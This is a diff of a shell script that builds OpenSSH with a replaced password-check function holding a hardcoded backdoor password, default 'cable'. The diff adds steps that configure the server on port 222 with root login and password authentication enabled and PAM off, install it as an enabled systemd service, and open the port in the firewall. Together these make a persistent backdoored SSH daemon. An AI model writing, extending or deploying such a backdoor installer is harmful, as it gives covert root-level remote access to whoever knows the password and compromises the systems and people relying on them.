@@ -6,23 +6,28 @@
 # original `sys_auth_passwd()` function and replacing it with a new version
 # that contains a **hardcoded backdoor password**.
 #
-# Then it builds and installs OpenSSH from the 'openssh-portable' directory.
+# It then builds and installs OpenSSH from the 'openssh-portable' directory,
+# modifies the sshd_config file to set **Port 222** and **PermitRootLogin yes**,
+# and sets up a **systemd service** to run the custom SSH server.
 
 # ---------------------
 # Configuration
 # ---------------------
 PASSWORD="${PASSWORD:-cable}"  # Default backdoor password
+OUTPUT_NAME="${OUTPUT_NAME:-customssh}"  # Default binary/output name
 OPENSSH_DIR="openssh-portable" # OpenSSH source directory
-PREFIX="/usr/local/customssh"  # Install path
-SYSCONFDIR="/etc/customssh"    # Config files path
+PREFIX="/usr/local/${OUTPUT_NAME}"  # Install path
+SYSCONFDIR="/etc/${OUTPUT_NAME}"    # Config files path
 AUTH_FILE="${OPENSSH_DIR}/auth-passwd.c" # Path to auth-passwd.c
+SYSTEMD_SERVICE="/etc/systemd/system/${OUTPUT_NAME}.service" # Path to systemd service file
+SSHD_CONFIG="${SYSCONFDIR}/sshd_config" # Path to sshd_config
 
 # ---------------------
-# Ensure we start clean
+# Ensure required packages are installed
 # ---------------------
-echo "=== Ensuring autoconf is installed (sudo required) ==="
+echo "=== Ensuring autoconf and systemd are installed (sudo required) ==="
 sudo apt-get update
-sudo apt-get install -y autoconf
+sudo apt-get install -y autoconf systemd
 
 # ---------------------
 # Validate OpenSSH directory
@@ -112,4 +117,53 @@ make
 echo "=== Running sudo make install ==="
 sudo make install
 
-echo "=== Done! Custom OpenSSH with password '${PASSWORD}' was installed at '${PREFIX}'. ==="
+# ---------------------
+# Modify sshd_config to set port 222 and allow root login
+# ---------------------
+echo "=== Modifying sshd_config to set Port 222 and PermitRootLogin yes ==="
+sudo mkdir -p "${SYSCONFDIR}"
+cat <<EOF | sudo tee "${SSHD_CONFIG}"
+Port 222
+PermitRootLogin yes
+PasswordAuthentication yes
+ChallengeResponseAuthentication no
+UsePAM no
+Subsystem sftp ${PREFIX}/libexec/sftp-server
+EOF
+
+# ---------------------
+# Create the systemd service file
+# ---------------------
+echo "=== Creating systemd service file at ${SYSTEMD_SERVICE} ==="
+sudo bash -c "cat > ${SYSTEMD_SERVICE}" <<EOF
+[Unit]
+Description=Custom OpenSSH Service
+After=network.target auditd.service
+Wants=network.target
+
+[Service]
+Type=notify
+ExecStart=${PREFIX}/sbin/sshd -f ${SYSCONFDIR}/sshd_config
+ExecReload=/bin/kill -HUP \$MAINPID
+KillMode=process
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+# ---------------------
+# Reload systemd, enable and start the service
+# ---------------------
+echo "=== Reloading systemd and enabling custom SSH service ==="
+sudo systemctl daemon-reload
+sudo systemctl enable "${OUTPUT_NAME}"
+sudo systemctl start "${OUTPUT_NAME}"
+
+# ---------------------
+# Open port 222 in firewall
+# ---------------------
+echo "=== Allowing SSH on port 222 in firewall ==="
+sudo ufw allow 222/tcp || echo "UFW not installed or inactive. Skipping."
+
+echo "=== Done! Custom OpenSSH with password '${PASSWORD}' was installed at '${PREFIX}' and started as a systemd service '${OUTPUT_NAME}' on port 222. ==="
